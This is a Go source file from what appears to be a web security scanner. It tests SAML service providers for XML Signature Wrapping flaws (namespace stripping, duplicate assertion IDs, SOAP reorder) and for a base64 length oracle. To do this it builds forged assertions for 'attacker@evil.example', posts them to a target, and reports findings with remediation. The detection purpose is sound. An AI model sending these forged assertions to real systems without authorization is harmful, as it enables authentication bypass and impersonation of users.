package samlinj

import (
	"context"
	"encoding/base64"
	"fmt"
	"net/url"
	"regexp"
	"strings"
	"time"

	"github.com/TyrusRC/swiss-knife-for-web-security/internal/core"
)

// XSWOptions configures the per-call timeout and lets callers override
// the SAML endpoint and the SAMLResponse outer template. Zero-value
// fields fall back to package defaults so the common-case call site can
// stay terse.
type XSWOptions struct {
	// SAMLEndpoint is the SP ACS URL to probe. If empty, the URL passed
	// directly to the Detect* method wins.
	SAMLEndpoint string
	// SAMLResponseTemplate is the outer <samlp:Response> envelope into
	// which the wrapped Assertion(s) are spliced. Must contain the
	// sentinel "{{ASSERTIONS}}" placeholder. Empty -> default envelope.
	SAMLResponseTemplate string
	// Timeout caps the per-probe HTTP wait. Zero -> no override.
	Timeout time.Duration
}

// defaultSAMLResponseTemplate is the outer envelope the XSW variants
// splice into. The {{ASSERTIONS}} marker is replaced with one or more
// crafted <saml:Assertion> blocks per variant.
const defaultSAMLResponseTemplate = `<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
  xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" Version="2.0"
  IssueInstant="2026-01-01T00:00:00Z" Destination="REPLACE_DEST" ID="r1">
  <saml:Issuer>https://idp.example/</saml:Issuer>
  {{ASSERTIONS}}
</samlp:Response>`

// attackerNameID is the malicious identity the XSW variants try to
// impersonate. The vulnerable mock SP picks the *first* <saml:NameID>
// it sees, so all crafted assertions are placed earlier in document
// order than the original signed assertion.
const attackerNameID = "attacker@evil.example"

// xmlnsDeclRe matches xmlns:* attribute declarations so we can strip
// them from the malicious assertion in variant #1.
var xmlnsDeclRe = regexp.MustCompile(`\s+xmlns(:[a-zA-Z0-9_-]+)?="[^"]*"`)

// assertionIDRe extracts an ID="..." attribute from an Assertion block.
var assertionIDRe = regexp.MustCompile(`(?s)<saml:Assertion[^>]*\sID="([^"]+)"`)

// DetectXSWNamespaceStripping crafts a malicious Assertion with its
// xmlns declarations removed, wrapped alongside the original signed
// Assertion. A naive SP that ignores namespace context will still
// extract the attacker's NameID and authenticate the session.
func (d *Detector) DetectXSWNamespaceStripping(ctx context.Context, samlURL, baseAssertion string) (*core.Finding, error) {
	if d.client == nil {
		return nil, nil
	}
	malicious := buildMaliciousAssertion("xsw-ns-stripped")
	malicious = xmlnsDeclRe.ReplaceAllString(malicious, "")
	payload := assembleSAMLResponse(malicious + "\n" + baseAssertion)
	resp, err := d.postSAML(ctx, samlURL, payload)
	if !spAcceptedAssertion(resp, err) {
		return nil, nil
	}
	return d.xswFinding(
		samlURL,
		"XML Signature Wrapping (Namespace Stripping)",
		"xsw-namespace-stripping",
		core.SeverityCritical,
		"The SP accepted a SAMLResponse whose wrapped Assertion had its xmlns declarations stripped. A correctly implemented SAML library MUST resolve element namespaces before processing — stripping should produce a parse error or unauthenticated rejection.",
	), nil
}

// DetectXSWDuplicateID injects two <saml:Assertion> blocks with the
// same ID attribute — one signed (original), one with attacker-chosen
// NameID. SAML libraries that index assertions by ID without checking
// uniqueness will resolve the signature reference to either one.
func (d *Detector) DetectXSWDuplicateID(ctx context.Context, samlURL, baseAssertion string) (*core.Finding, error) {
	if d.client == nil {
		return nil, nil
	}
	id := extractAssertionID(baseAssertion)
	if id == "" {
		id = "signed-a1"
	}
	malicious := buildMaliciousAssertionWithID(id)
	payload := assembleSAMLResponse(malicious + "\n" + baseAssertion)
	resp, err := d.postSAML(ctx, samlURL, payload)
	if !spAcceptedAssertion(resp, err) {
		return nil, nil
	}
	return d.xswFinding(
		samlURL,
		"XML Signature Wrapping (Duplicate Assertion ID)",
		"xsw-duplicate-id",
		core.SeverityCritical,
		"The SP accepted a SAMLResponse containing two <saml:Assertion> elements with the same ID — one signed, one attacker-controlled. SAML libraries MUST reject documents with duplicate IDs; allowing them is the textbook XSW primitive (Somorovsky et al., 2012).",
	), nil
}

// DetectXSWSOAPReorder wraps the payload in a SOAP envelope where the
// signed Assertion sits in the SOAP Header and the malicious one sits
// in the Body — relying on the SP traversing Body first while signature
// validation walked Header.
func (d *Detector) DetectXSWSOAPReorder(ctx context.Context, samlURL, baseAssertion string) (*core.Finding, error) {
	if d.client == nil {
		return nil, nil
	}
	malicious := buildMaliciousAssertion("xsw-soap-reorder")
	// SOAP envelope: signed in Header, malicious in Body, then re-wrap
	// the whole thing as a samlp:Response so the HTTP-POST binding
	// accepts it. Real SOAP-bound SAML uses a different binding, but
	// mock SPs that grep for <saml:Assertion> still bite.
	soap := `<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/">
  <SOAP-ENV:Header>
    ` + baseAssertion + `
  </SOAP-ENV:Header>
  <SOAP-ENV:Body>
    ` + malicious + `
  </SOAP-ENV:Body>
</SOAP-ENV:Envelope>`
	payload := assembleSAMLResponse(soap)
	resp, err := d.postSAML(ctx, samlURL, payload)
	if !spAcceptedAssertion(resp, err) {
		return nil, nil
	}
	return d.xswFinding(
		samlURL,
		"XML Signature Wrapping (SOAP Header/Body Reorder)",
		"xsw-soap-reorder",
		core.SeverityCritical,
		"The SP accepted a SAMLResponse where signed and unsigned assertions were placed in different SOAP sections. SAML processors MUST resolve the signature reference and consume attributes from the SAME element subtree — otherwise an attacker can sign Header and have the SP read Body.",
	), nil
}

// DetectXSWBase64Oracle probes whether the SP's error responses
// discriminate by base64 length — a side-channel that turns an
// encrypted-assertion deployment into a Bleichenbacher-style oracle.
// Sends 6 progressively-truncated payloads; flags Medium if the
// (status, body-len-bucket) tuples are not uniform.
func (d *Detector) DetectXSWBase64Oracle(ctx context.Context, samlURL, baseAssertion string) (*core.Finding, error) {
	if d.client == nil {
		return nil, nil
	}
	payload := assembleSAMLResponse(baseAssertion)
	full := base64.StdEncoding.EncodeToString([]byte(payload))
	// Probe ladder: 6 distinct lengths chosen to hit every length-mod-4
	// bucket and also ensure non-trivial decode failures.
	lengths := []int{len(full), len(full) - 1, len(full) - 2, len(full) - 3, len(full) / 2, len(full) / 3}
	type sig struct {
		status int
		bucket int
	}
	seen := make(map[sig]int)
	var evidence strings.Builder
	for _, L := range lengths {
		if L <= 0 || L > len(full) {
			continue
		}
		select {
		case <-ctx.Done():
			return nil, ctx.Err()
		default:
		}
		truncated := full[:L]
		form := "SAMLResponse=" + url.QueryEscape(truncated) + "&RelayState=skws"
		client := d.client.Clone().WithFollowRedirects(false)
		resp, err := client.SendRawBody(ctx, samlURL, "POST", form, "application/x-www-form-urlencoded")
		if err != nil || resp == nil {
			continue
		}
		bucket := len(resp.Body) / 16
		s := sig{status: resp.StatusCode, bucket: bucket}
		seen[s]++
		fmt.Fprintf(&evidence, "len=%d -> status=%d body~%dB\n", L, resp.StatusCode, len(resp.Body))
	}
	// Need at least 2 distinct (status, bucket) signatures to call it
	// a discriminating oracle. A single uniform 400 across all lengths
	// is the safe-by-default behavior.
	if len(seen) < 2 {
		return nil, nil
	}
	finding := d.xswFinding(
		samlURL,
		"XML Signature Wrapping (Base64 Length Oracle)",
		"xsw-base64-oracle",
		core.SeverityMedium,
		"The SP returns distinct status/body shapes for SAMLResponses truncated to different base64 lengths. When the assertion is encrypted, this leakage enables Bleichenbacher-style padding-oracle attacks against the SAML EncryptedKey.",
	)
	finding.Evidence = evidence.String() + fmt.Sprintf("Distinct response signatures: %d", len(seen))
	return finding, nil
}

// buildMaliciousAssertion crafts an unsigned attacker Assertion with
// the package's attackerNameID.
func buildMaliciousAssertion(id string) string {
	return `<saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="` + id + `" Version="2.0" IssueInstant="2026-01-01T00:00:00Z">
  <saml:Issuer>https://idp.example/</saml:Issuer>
  <saml:Subject><saml:NameID>` + attackerNameID + `</saml:NameID></saml:Subject>
</saml:Assertion>`
}

// buildMaliciousAssertionWithID is like buildMaliciousAssertion but
// reuses a caller-supplied ID — used by the duplicate-ID variant.
func buildMaliciousAssertionWithID(id string) string {
	return `<saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="` + id + `" Version="2.0" IssueInstant="2026-01-01T00:00:00Z">
  <saml:Issuer>https://idp.example/</saml:Issuer>
  <saml:Subject><saml:NameID>` + attackerNameID + `</saml:NameID></saml:Subject>
</saml:Assertion>`
}

// extractAssertionID pulls the ID="..." value out of a signed assertion
// blob so the duplicate-ID variant can reuse it.
func extractAssertionID(assertion string) string {
	m := assertionIDRe.FindStringSubmatch(assertion)
	if len(m) < 2 {
		return ""
	}
	return m[1]
}

// assembleSAMLResponse splices the assertion(s) into the package's
// default outer Response envelope.
func assembleSAMLResponse(assertions string) string {
	return strings.Replace(defaultSAMLResponseTemplate, "{{ASSERTIONS}}", assertions, 1)
}

// postSAML POSTs base64(payload) as SAMLResponse to the target URL.
func (d *Detector) postSAML(ctx context.Context, target, payload string) (*spResponse, error) {
	body := strings.ReplaceAll(payload, "REPLACE_DEST", target)
	encoded := base64.StdEncoding.EncodeToString([]byte(body))
	form := "SAMLResponse=" + url.QueryEscape(encoded) + "&RelayState=skws"
	client := d.client.Clone().WithFollowRedirects(false)
	resp, err := client.SendRawBody(ctx, target, "POST", form, "application/x-www-form-urlencoded")
	if err != nil || resp == nil {
		return nil, err
	}
	return &spResponse{StatusCode: resp.StatusCode, Body: resp.Body, SetCookie: resp.Headers["Set-Cookie"]}, nil
}

// spResponse is a narrow view of the SP response, just enough for
// spAcceptedAssertion to make its decision.
type spResponse struct {
	StatusCode int
	Body       string
	SetCookie  string
}

// spAcceptedAssertion returns true when the SP behaved as if it
// authenticated the bogus assertion: 302/303 (post-login redirect) or
// 2xx with a session cookie / SAML-y body.
func spAcceptedAssertion(resp *spResponse, err error) bool {
	if err != nil || resp == nil {
		return false
	}
	if resp.StatusCode >= 400 {
		return false
	}
	if resp.StatusCode == 302 || resp.StatusCode == 303 {
		return true
	}
	if resp.StatusCode >= 200 && resp.StatusCode < 300 {
		if resp.SetCookie != "" {
			return true
		}
		lower := strings.ToLower(resp.Body)
		if strings.Contains(lower, "saml") || strings.Contains(lower, "session") || strings.Contains(lower, "logged") {
			return true
		}
	}
	return false
}

// xswFinding builds a populated core.Finding with the OWASP/CWE
// mappings every XSW variant shares.
func (d *Detector) xswFinding(target, title, kind string, severity core.Severity, description string) *core.Finding {
	finding := core.NewFinding(title, severity)
	finding.Title = title
	finding.URL = target
	finding.Parameter = "SAMLResponse"
	finding.Tool = "samlinj-xsw-detector"
	finding.Confidence = core.ConfidenceHigh
	finding.Description = description
	finding.Evidence = "Variant: " + kind + "\nSP did not reject the wrapped/duplicate assertion."
	finding.Remediation = "Use a SAML library that (a) validates the XML signature reference resolves to the SAME element subtree from which attributes are read, (b) rejects documents with duplicate xml:id values, (c) requires xmlns declarations to be present on wrapped elements, and (d) returns a uniform error for every malformed/undecryptable response."
	finding.WithOWASPMapping(
		[]string{"WSTG-IDNT-08"},
		[]string{"A07:2025"},
		[]string{"CWE-347"},
	)
	finding.APITop10 = []string{"API2:2023"}
	return finding
}
